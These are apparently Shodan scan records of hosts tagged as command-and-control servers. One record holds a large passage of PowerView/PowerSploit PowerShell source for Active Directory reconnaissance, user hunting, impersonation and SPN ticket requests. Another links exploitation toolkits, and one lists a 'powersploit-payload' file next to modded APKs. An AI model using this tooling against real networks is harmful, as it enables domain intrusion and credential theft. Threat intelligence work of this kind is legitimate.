'userAccountControl' property for users/groups\n$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{\n    SCRIPT                          =   1\n    ACCOUNTDISABLE                  =   2\n    HOMEDIR_REQUIRED                =   8\n    LOCKOUT                         =   16\n    PASSWD_NOTREQD                  =   32\n    PASSWD_CANT_CHANGE              =   64\n    ENCRYPTED_TEXT_PWD_ALLOWED      =   128\n    TEMP_DUPLICATE_ACCOUNT          =   256\n    NORMAL_ACCOUNT                  =   512\n    INTERDOMAIN_TRUST_ACCOUNT       =   2048\n    WORKSTATION_TRUST_ACCOUNT       =   4096\n    SERVER_TRUST_ACCOUNT            =   8192\n    DONT_EXPIRE_PASSWORD            =   65536\n    MNS_LOGON_ACCOUNT               =   131072\n    SMARTCARD_REQUIRED              =   262144\n    TRUSTED_FOR_DELEGATION          =   524288\n    NOT_DELEGATED                   =   1048576\n    USE_DES_KEY_ONLY                =   2097152\n    DONT_REQ_PREAUTH                =   4194304\n    PASSWORD_EXPIRED                =   8388608\n    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216\n    PARTIAL_SECRETS_ACCOUNT         =   67108864\n} -Bitfield\n\n# enum used by $WTS_SESSION_INFO_1 below\n$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{\n    Active       =    0\n    Connected    =    1\n    ConnectQuery =    2\n    Shadow       =    3\n    Disconnected =    4\n    Idle         =    5\n    Listen       =    6\n    Reset        =    7\n    Down         =    8\n    Init         =    9\n}\n\n# the WTSEnumerateSessionsEx result structure\n$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{\n    ExecEnvId = field 0 UInt32\n    State = field 1 $WTSConnectState\n    SessionId = field 2 UInt32\n    pSessionName = field 3 String -MarshalAs @('LPWStr')\n    pHostName = field 4 String -MarshalAs @('LPWStr')\n    pUserName = field 5 String -MarshalAs @('LPWStr')\n    pDomainName = field 6 String -MarshalAs @('LPWStr')\n    pFarmName = field 7 String -MarshalAs @('LPWStr')\n}\n\n# the particular WTSQuerySessionInformation result structure\n$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{\n    AddressFamily = field 0 UInt32\n    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)\n}\n\n# the NetShareEnum result structure\n$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{\n    Name = field 0 String -MarshalAs @('LPWStr')\n    Type = field 1 UInt32\n    Remark = field 2 String -MarshalAs @('LPWStr')\n}\n\n# the NetWkstaUserEnum result structure\n$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{\n    UserName = field 0 String -MarshalAs @('LPWStr')\n    LogonDomain = field 1 String -MarshalAs @('LPWStr')\n    AuthDomains = field 2 String -MarshalAs @('LPWStr')\n    LogonServer = field 3 String -MarshalAs @('LPWStr')\n}\n\n# the NetSessionEnum result structure\n$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{\n    CName = field 0 String -MarshalAs @('LPWStr')\n    UserName = field 1 String -MarshalAs @('LPWStr')\n    Time = field 2 UInt32\n    IdleTime = field 3 UInt32\n}\n\n# enum used by $LOCALGROUP_MEMBERS_INFO_2 below\n$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{\n    SidTypeUser             = 1\n    SidTypeGroup            = 2\n    SidTypeDomain           = 3\n    SidTypeAlias            = 4\n    SidTypeWellKnownGroup   = 5\n    SidTypeDeletedAccount   = 6\n    SidTypeInvalid          = 7\n    SidTypeUnknown          = 8\n    SidTypeComputer         = 9\n}\n\n# the NetLocalGroupEnum result structure\n$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{\n    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')\n    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')\n}\n\n# the NetLocalGroupGetMembers result structure\n$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{\n    lgrmi2_sid = field 0 IntPtr\n    lgrmi2_sidusage = field 1 $SID_NAME_USE\n    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')\n}\n\n# enums used in DS_DOMAIN_TRUSTS\n$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{\n    IN_FOREST       = 1\n    DIRECT_OUTBOUND = 2\n    TREE_ROOT       = 4\n    PRIMARY         = 8\n    NATIVE_MODE     = 16\n    DIRECT_INBOUND  = 32\n} -Bitfield\n$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{\n    DOWNLEVEL   = 1\n    UPLEVEL     = 2\n    MIT         = 3\n    DCE         = 4\n}\n$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{\n    NON_TRANSITIVE      = 1\n    UPLEVEL_ONLY        = 2\n    FILTER_SIDS         = 4\n    FOREST_TRANSITIVE   = 8\n    CROSS_ORGANIZATION  = 16\n    WITHIN_FOREST       = 32\n    TREAT_AS_EXTERNAL   = 64\n}\n\n# the DsEnumerateDomainTrusts result structure\n$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{\n    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')\n    DnsDomainName = field 1 String -MarshalAs @('LPWStr')\n    Flags = field 2 $DsDomainFlag\n    ParentIndex = field 3 UInt32\n    TrustType = field 4 $DsDomainTrustType\n    TrustAttributes = field 5 $DsDomainTrustAttributes\n    DomainSid = field 6 IntPtr\n    DomainGuid = field 7 Guid\n}\n\n# used by WNetAddConnection2W\n$NETRESOURCEW = struct $Mod NETRESOURCEW @{\n    dwScope =         field 0 UInt32\n    dwType =          field 1 UInt32\n    dwDisplayType =   field 2 UInt32\n    dwUsage =         field 3 UInt32\n    lpLocalName =     field 4 String -MarshalAs @('LPWStr')\n    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')\n    lpComment =       field 6 String -MarshalAs @('LPWStr')\n    lpProvider =      field 7 String -MarshalAs @('LPWStr')\n}\n\n# all of the Win32 API functions we need\n$FunctionDefinitions = @(\n    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),\n    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),\n    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),\n    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),\n    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),\n    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),\n    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),\n    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),\n    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),\n    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),\n    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),\n    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),\n    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),\n    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),\n    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),\n    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),\n    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),\n    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),\n    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),\n    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),\n    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),\n    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),\n    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)\n)\n\n$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'\n$Netapi32 = $Types['netapi32']\n$Advapi32 = $Types['advapi32']\n$Wtsapi32 = $Types['wtsapi32']\n$Mpr = $Types['Mpr']\n$Kernel32 = $Types['kernel32']\n\nSet-Alias Get-IPAddress Resolve-IPAddress\nSet-Alias Convert-NameToSid ConvertTo-SID\nSet-Alias Convert-SidToName ConvertFrom-SID\nSet-Alias Request-SPNTicket Get-DomainSPNTicket\nSet-Alias Get-DNSZone Get-DomainDNSZone\nSet-Alias Get-DNSRecord Get-DomainDNSRecord\nSet-Alias Get-NetDomain Get-Domain\nSet-Alias Get-NetDomainController Get-DomainController\nSet-Alias Get-NetForest Get-Forest\nSet-Alias Get-NetForestDomain Get-ForestDomain\nSet-Alias Get-NetForestCatalog Get-ForestGlobalCatalog\nSet-Alias Get-NetUser Get-DomainUser\nSet-Alias Get-UserEvent Get-DomainUserEvent\nSet-Alias Get-NetComputer Get-DomainComputer\nSet-Alias Get-ADObject Get-DomainObject\nSet-Alias Set-ADObject Set-DomainObject\nSet-Alias Get-ObjectAcl Get-DomainObjectAcl\nSet-Alias Add-ObjectAcl Add-DomainObjectAcl\nSet-Alias Invoke-ACLScanner Find-InterestingDomainAcl\nSet-Alias Get-GUIDMap Get-DomainGUIDMap\nSet-Alias Get-NetOU Get-DomainOU\nSet-Alias Get-NetSite Get-DomainSite\nSet-Alias Get-NetSubnet Get-DomainSubnet\nSet-Alias Get-NetGroup Get-DomainGroup\nSet-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup\nSet-Alias Get-NetGroupMember Get-DomainGroupMember\nSet-Alias Get-NetFileServer Get-DomainFileServer\nSet-Alias Get-DFSshare Get-DomainDFSShare\nSet-Alias Get-NetGPO Get-DomainGPO\nSet-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup\nSet-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping\nSet-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping\nSet-Alias Get-LoggedOnLocal Get-RegLoggedOn\nSet-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess\nSet-Alias Get-SiteName Get-NetComputerSiteName\nSet-Alias Get-Proxy Get-WMIRegProxy\nSet-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn\nSet-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection\nSet-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive\nSet-Alias Get-NetProcess Get-WMIProcess\nSet-Alias Invoke-ThreadedFunction New-ThreadedFunction\nSet-Alias Invoke-UserHunter Find-DomainUserLocation\nSet-Alias Invoke-ProcessHunter Find-DomainProcess\nSet-Alias Invoke-EventHunter Find-DomainUserEvent\nSet-Alias Invoke-ShareFinder Find-DomainShare\nSet-Alias Invoke-FileFinder Find-InterestingDomainShareFile\nSet-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember\nSet-Alias Get-NetDomainTrust Get-DomainTrust\nSet-Alias Get-NetForestTrust Get-ForestTrust\nSet-Alias Find-ForeignUser Get-DomainForeignUser\nSet-Alias Find-ForeignGroup Get-DomainForeignGroupMember\nSet-Alias Invoke-MapDomainTrust Get-DomainTrustMapping\nSet-Alias Get-DomainPolicy Get-DomainPolicyData\n", "location": "/", "components": {}, "securitytxt_hash": null, "sitemap": null, "html_hash": -1815652882}, "os": null, "tags": ["cloud", "c2"], "timestamp": "2023-12-24T19:27:04.489276", "isp": "Amazon.com, Inc.", "transport": "tcp", "_shodan": {"region": "na", "module": "http", "ptr": true, "options": {}, "id": "f8e08b8b-ac96-40b2-a89a-0370916e2186", "crawler": "fce091bb56e19f2cc04e7cd0f9c8a1c1805d961a"}, "asn": "AS14618", "cloud": {"region": "us-east-1", "service": "EC2", "provider": "Amazon"}, "hostnames": ["ec2-3-93-178-75.compute-1.amazonaws.com"], "location": {"city": "Ashburn", "region_code": "VA", "area_code": null, "longitude": -77.48749, "latitude": 39.04372, "country_code": "US", "country_name": "United States"}, "ip": 56472139, "domains": ["amazonaws.com"], "org": "Amazon Data Services NoVa", "data": "HTTP/1.1 200 OK\r\nDate: Sun, 24 Dec 2023 19:27:04 GMT\r\nServer: Apache/2.4.58 (Amazon Linux)\r\nLast-Modified: Tue, 28 Nov 2023 14:22:05 GMT\r\nETag: \"bc0e7-60b37249a5d1e\"\r\nAccept-Ranges: bytes\r\nContent-Length: 770279\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n", "port": 80, "opts": {}, "ip_str": "3.93.178.75"}
{"ip": 584890966, "http": {"status": 200, "robots_hash": null, "redirects": [], "securitytxt": null, "title": "Welcome to Evil Server Tips!", "sitemap_hash": null, "robots": null, "server": "nginx/1.24.0", "headers_hash": 1245094173, "host": "34.220.186.86", "html": "<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to Evil Server Tips!</title>\n<style>\nhtml { color-scheme: dark; }\nbody { width: 35em; margin: 0 auto;\nfont-family: Tahoma, Verdana, Arial, sans-serif; }\n</style>\n</head>\n<body>\n<h1>Welcome to Evil Server Tips!</h1>\n<p>\n    <h2>All-in-one References</h2>\n    <ul><a href=\"https://book.hacktricks.xyz/\">Ref 1</a></ul>\n    <ul><a href=\"https://github.com/sundowndev/hacker-roadmap\">Ref 2</a></ul>\n</p>\n<hr>\n<p>\n    <h2>Tools</h2>\n    <ul><a href=\"https://github.com/carlospolop/PEASS-ng\">PrivEsc</a></ul>\n    <ul><a href=\"https://gitlab.com/kalilinux/packages/enum4linux\">Linux Enumeration</a></ul>\n    <ul><a href=\"https://github.com/ParrotSec/mimikatz\">Windows Exploitation</a></ul>\n    <ul><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings\">Payload All the Things</a></ul>\n    <ul><a href=\"https://github.com/danielmiessler/SecLists\">Word Lists</a></ul>\n    <ul><a href=\"https://github.com/PowerShellMafia/PowerSploit\">PowerShell Exploits</a></ul>\n</p>\n<hr>\n<p>\n    <h2>Service Enumeration</h2>\n    <ul><a href=\"https://subscription.packtpub.com/book/networking-and-servers/9781783289592/4/ch04lvl1sec30/service-enumeration\">Ref 1</a></ul>\n    <ul><a href=\"https://glytcher.com/service-enumeration/\">Ref 2</a></ul>\n    <ul><a href=\"https://blog.certcube.com/oscp-enumeration-cheatsheet/\">Ref 3</a> </ul>\n</p>\n<hr>\n<p>\n    <h2>Linux Enumeration</h2>\n    <ul><a href=\"https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet\">Ref 1</a></ul>\n</p>\n<hr>\n<p>\n    <h2>Windows Enumeration</h2>\n    <ul><a href=\"https://joshruppe.com/basic-windows-enumeration/\">Ref 1</a></ul>\n</p>\n<hr>\n<p>\n    <h2>Windows Post Exploitation</h2>\n    <ul><a href=\"https://www.daronwolff.com/windows-enumeration-post-explotation/\"> Ref 1 </a></ul>\n</p>\n<hr>\n<p>\n    <h2>Active Directory Exploitation</h2>\n    <ul> <a href=\"https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet\"> Ref 1 </a> </ul>\n</p>\n\n</body>\n</html>\n", "location": "/", "components": {}, "securitytxt_hash": null, "sitemap": null, "html_hash": -752300247}, "port": 80, "transport": "tcp", "cloud": {"region": "us-west-2", "service": "EC2", "provider": "Amazon"}, "location": {"city": "Boardman", "region_code": "OR", "area_code": null, "longitude": -119.70058, "latitude": 45.83986, "country_code": "US", "country_name": "United States"}, "product": "PowerSploit", "hash": 776788719, "tags": ["cloud", "c2"], "timestamp": "2023-12-24T17:36:25.575433", "hostnames": ["ec2-34-220-186-86.us-west-2.compute.amazonaws.com"], "org": "Amazon Technologies Inc.", "data": "HTTP/1.1 200 OK\r\nServer: nginx/1.24.0\r\nDate: Sun, 24 Dec 2023 17:36:25 GMT\r\nContent-Type: text/html\r\nContent-Length: 1978\r\nLast-Modified: Mon, 26 Jun 2023 15:35:16 GMT\r\nConnection: keep-alive\r\nETag: \"6499b034-7ba\"\r\nAccept-Ranges: bytes\r\n\r\n", "asn": "AS16509", "cpe23": ["cpe:2.3:a:f5:nginx:1.24.0"], "isp": "Amazon.com, Inc.", "cpe": ["cpe:/a:f5:nginx:1.24.0"], "domains": ["amazonaws.com"], "ip_str": "34.220.186.86", "os": null, "_shodan": {"region": "eu", "module": "http", "ptr": true, "options": {}, "id": "70012d4a-36a7-43b0-a3a9-7f602b11c8b7", "crawler": "b7e172aad7e9ee5ee713a53e504c71bd19d7b284"}, "opts": {}}
{"ip": 3040388802, "hash": -172563970, "port": 80, "transport": "tcp", "version": "2.4.58", "location": {"city": "Manizales", "region_code": "CAL", "area_code": null, "longitude": -75.51738, "latitude": 5.06889, "country_code": "CO", "country_name": "Colombia"}, "product": "Apache httpd", "http": {"status": 200, "robots_hash": null, "redirects": [], "securitytxt": null, "title": "Index of /", "sitemap_hash": null, "robots": null, "server": "Apache/2.4.58 (Debian)", "headers_hash": 1941529999, "host": "181.56.166.194", "html": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<html>\n <head>\n  <title>Index of /</title>\n </head>\n <body>\n<h1>Index of /</h1>\n  <table>\n   <tr><th valign=\"top\"><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr>\n   <tr><th colspan=\"5\"><hr></th></tr>\n<tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"GBWhatsAppProv1752.apk\">GBWhatsAppProv1752.apk</a></td><td align=\"right\">2023-09-10 09:49  </td><td align=\"right\"> 69M</td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"GBWhatsAppv1755.apk\">GBWhatsAppv1755.apk</a></td><td align=\"right\">2023-10-28 22:04  </td><td align=\"right\"> 70M</td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"GBWhatsAppv1755.html\">GBWhatsAppv1755.html</a></td><td align=\"right\">2023-10-28 22:04  </td><td align=\"right\"> 36K</td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"WhatsAppPlusv1752.apk\">WhatsAppPlusv1752.apk</a></td><td align=\"right\">2023-09-10 09:35  </td><td align=\"right\"> 69M</td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"base.apk\">base.apk</a></td><td align=\"right\">2023-09-11 19:18  </td><td align=\"right\">5.8M</td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"base.html\">base.html</a></td><td align=\"right\">2023-09-11 19:18  </td><td align=\"right\">253K</td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"index.nginx-debian.html\">index.nginx-debian.html</a></td><td align=\"right\">2023-08-15 03:34  </td><td align=\"right\">615 </td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/unknown.gif\" alt=\"[   ]\"></td><td><a href=\"powersploit-payload\">powersploit-payload</a></td><td align=\"right\">2022-11-11 23:58  </td><td align=\"right\"> 23K</td><td>&nbsp;</td></tr>\n   <tr><th colspan=\"5\"><hr></th></tr>\n</table>\n<address>Apache/2.4.58 (Debian) Server at 181.56.166.194 Port 80</address>\n</body></html>\n", "location": "/", "components": {}, "html_hash": -2084450562, "sitemap": null, "securitytxt_hash": null}, "timestamp": "2023-12-13T05:56:46.589568", "hostnames": ["static-ip-18156166194.cable.net.co"], "org": "Telmex Colombia S.A.", "data": "HTTP/1.1 200 OK\r\nDate: Wed, 13 Dec 2023 05:56:46 GMT\r\nServer: Apache/2.4.58 (Debian)\r\nVary: Accept-Encoding\r\nContent-Length: 2277\r\nContent-Type: text/html;charset=UTF-8\r\n\r\n", "asn": "AS10620", "cpe23": ["cpe:2.3:a:apache:http_server:2.4.58"], "info": "(Debian)", "isp": "Telmex Colombia S.A.", "cpe": ["cpe:/a:apache:http_server:2.4.58"], "domains": ["cable.net.co"], "ip_str": "181.56.166.194", "os": null, "_shodan": {"region": "na", "ptr": true, "module": "http", "id": "cb0d1c1f-6a72-4408-af28-fed162a0ef8c", "options": {}, "crawler": "e15fd8f613780213727556a9cb02788d26131443"}, "opts": {}}
